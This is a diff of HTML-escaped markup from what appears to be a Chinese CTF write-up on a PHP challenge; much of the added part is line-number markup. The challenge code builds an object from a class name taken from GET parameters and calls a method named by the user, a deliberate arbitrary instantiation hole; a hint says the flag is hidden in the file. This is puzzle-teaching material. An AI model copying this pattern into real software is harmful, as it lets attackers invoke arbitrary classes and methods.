-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt;()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;self&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;$c;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$rc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rc&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$rb&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ra&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ra&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$rd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rd&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$method&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; $rc($ra, $rb);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;var_dump&lt;/span&gt;($method&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;$rd());
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个&lt;code&gt;$ra&lt;/code&gt;、&lt;code&gt;$rb&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;User&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
